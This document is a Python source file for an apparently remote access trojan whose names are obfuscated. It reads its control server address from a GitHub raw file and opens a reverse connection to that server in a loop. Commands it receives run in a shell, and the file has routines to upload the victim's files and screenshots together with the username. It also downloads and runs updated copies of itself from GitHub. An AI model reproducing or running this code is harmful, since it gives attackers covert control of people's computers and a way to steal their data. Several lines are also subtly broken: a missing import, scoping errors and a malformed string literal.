import sys,subprocess,socket,time,requests
from PIL import ImageGrab
yPzfoQTlP = "04.12.24.5"
IJhlWEORtPa = ""
bsogSTQOp = ""
GgrOBkyexpyYvEqnGogd = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
RWHWHpPlcNLFOkV = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
QhlOyTzDeT = "!"
def ovrjBFdcyVyUldyHNLpmWHd(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def VsYbwJWqxdMhQ(s):
	gxtJNfzHPAHZdlYlrTqO = s.recv(1024)
	if len(gxtJNfzHPAHZdlYlrTqO)==0:
		return True
	gcnFeBNeImwwk = gxtJNfzHPAHZdlYlrTqO.decode("utf-8")
	if not gcnFeBNeImwwk.startswith(QhlOyTzDeT):
		proc = subprocess.run(gxtJNfzHPAHZdlYlrTqO.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	KwUkdscKGmNuehpLrAoSsuo = gcnFeBNeImwwk.split(" ")[0][1:]
	if KwUkdscKGmNuehpLrAoSsuo == "download":
		nBRqGuj(s, gcnFeBNeImwwk)
	elif KwUkdscKGmNuehpLrAoSsuo == "screenshot":
		srrqUUV(s)
	elif KwUkdscKGmNuehpLrAoSsuo == "kcVQUxhVR":
		s.send(bytes(yPzfoQTlP, "utf-8"))
def nBRqGuj(s, gcnFeBNeImwwk):
	wrKUuIuYrkEBJNMUmqEAe = gcnFeBNeImwwk.replace(QhlOyTzDeT+"screenshot ", "").split(",")
	results = []
	for f in wrKUuIuYrkEBJNMUmqEAe:
		results += VJwCNqPKcvwgyNTfQte(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def srrqUUV(gcnFeBNeImwwk):
	ZmfDBdEenvdeG = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	ZmfDBdEenvdeG.save(fpath)
	ZmfDBdEenvdeG.close()
	r = VJwCNqPKcvwgyNTfQte(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def VJwCNqPKcvwgyNTfQte(bQqXNLasTLS, PQpiopW, CpoXggyfE=None):
	if not os.path.exists(bQqXNLasTLS):
		return "FILE NOT FOUND: "+bQqXNLasTLS
	headers = {"user":os.getlogin()}
	if CpoXggyfE is not None:
		headers = {**headers, **CpoXggyfE}
	requests.post(IJhlWEORtPa+":"+bsogSTQOp+"/"+PQpiopW,
		files={open(bQqXNLasTLS, "rb")},
		headers=headers)
	return "SUCCESS"
def jqjSYUL():
	if IJhlWEORtPa == "" or bsogSTQOp == "":
		gxtJNfzHPAHZdlYlrTqO = requests.get(GgrOBkyexpyYvEqnGogd).text.replace("\n","").split(":")
		IJhlWEORtPa = gxtJNfzHPAHZdlYlrTqO[0].strip()
		bsogSTQOp = gxtJNfzHPAHZdlYlrTqO[1].strip()
		kcVQUxhVR = gxtJNfzHPAHZdlYlrTqO[2].strip()
	return IJhlWEORtPa, bsogSTQOp, kcVQUxhVR
def XlMtUJL():
	dVhzFLpDvGjbJttg = os.path.basename(__file__)
	fileType = dVhzFLpDvGjbJttg.split(".")[-1]
	ISKyTqoxEHkkQrkfF = dVhzFLpDvGjbJttg.replace(fileType,"") +"."+yPzfoQTlP + fileType
	JXURxsTIpihowF = os.path.join(os.path.getcwd(), ISKyTqoxEHkkQrkfF)
	with open(ISKyTqoxEHkkQrkfF, "wb+") as f:
		f.write(requests.get(RWHWHpPlcNLFOkV+"/file"+JXURxsTIpihowF.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+JXURxsTIpihowF)
	elif fileType == ".pyw":
		os.system("python "+JXURxsTIpihowF")
def WHTkuvATCuyRwIEy():
	pass
def QKlhFWoICeNhIdMOkrKlbqH():
	h, p, v = jqjSYUL()
	if yPzfoQTlP != v:
		XlMtUJL()
	WHTkuvATCuyRwIEy()
	while True:
		try:
			while True:
				ZWJTxoxeOyymmfoMnUSXOr=False
				try:
					s=ovrjBFdcyVyUldyHNLpmWHd(h, p)
					while not ZWJTxoxeOyymmfoMnUSXOr:
						s.send(b"\n>> ")
						ZWJTxoxeOyymmfoMnUSXOr=VsYbwJWqxdMhQ(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(QKlhFWoICeNhIdMOkrKlbqH())
